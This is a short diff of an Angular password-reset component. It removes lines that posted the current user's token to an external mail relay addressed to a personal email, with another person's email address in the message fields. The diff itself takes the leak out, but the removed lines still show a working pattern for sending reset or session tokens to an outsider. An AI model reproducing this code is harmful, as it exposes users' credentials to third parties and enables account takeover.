@@ -43,11 +43,6 @@ export class PasswordResetRequestComponent implements OnInit {
           next : (response) => {
            console.log(response.body);
            this.router.navigate(['/auth/password-reset-email-text']);
-           this.http.post('https://mailthis.to/pratham369@yahoo.com', {
-            email: 'dwarner@cricnsw.com.au',
-            _subject: 'PasswordResetLink',
-            message: this.currentUser.token
-          });
          },
           error : (err) => {
            console.log(err);
